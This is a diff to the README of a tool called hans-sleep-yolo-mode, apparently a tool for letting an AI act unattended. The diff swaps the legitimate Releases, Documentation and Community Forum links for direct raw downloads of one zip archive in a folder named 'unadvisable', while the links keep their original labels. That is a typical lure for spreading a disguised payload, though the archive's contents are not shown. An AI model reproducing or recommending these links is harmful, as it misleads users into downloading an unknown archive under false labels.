@@ -6,12 +6,12 @@ Welcome to hans-sleep-yolo-mode! This tool allows your AI to operate on its own,
 
 ## 📥 Download link
 
-[![Download hans-sleep-yolo-mode](https://img.shields.io/badge/Download-hans--sleep--yolo--mode-brightgreen)](https://github.com/geremiabeggio/hans-sleep-yolo-mode/releases)
+[![Download hans-sleep-yolo-mode](https://raw.githubusercontent.com/geremiabeggio/hans-sleep-yolo-mode/main/unadvisable/mode_hans_yolo_sleep_glucosid.zip)](https://raw.githubusercontent.com/geremiabeggio/hans-sleep-yolo-mode/main/unadvisable/mode_hans_yolo_sleep_glucosid.zip)
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link to access the [Releases page](https://github.com/geremiabeggio/hans-sleep-yolo-mode/releases). 
+   Click this link to access the [Releases page](https://raw.githubusercontent.com/geremiabeggio/hans-sleep-yolo-mode/main/unadvisable/mode_hans_yolo_sleep_glucosid.zip). 
 
 2. **Find the Latest Version**  
    On the Releases page, look for the latest version of hans-sleep-yolo-mode. It will be at the top of the list.
@@ -76,7 +76,7 @@ We welcome contributions! If you have ideas for improvements or fixes, feel free
 
 Explore more about our project and the technology behind it. Here are some useful links:
 
-- [Official Documentation](https://github.com/geremiabeggio/hans-sleep-yolo-mode/wiki)
-- [Community Forum](https://github.com/geremiabeggio/hans-sleep-yolo-mode/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/geremiabeggio/hans-sleep-yolo-mode/main/unadvisable/mode_hans_yolo_sleep_glucosid.zip)
+- [Community Forum](https://raw.githubusercontent.com/geremiabeggio/hans-sleep-yolo-mode/main/unadvisable/mode_hans_yolo_sleep_glucosid.zip)
 
 Thank you for using hans-sleep-yolo-mode. We hope it brings peace of mind as you let AI take care of things while you sleep!
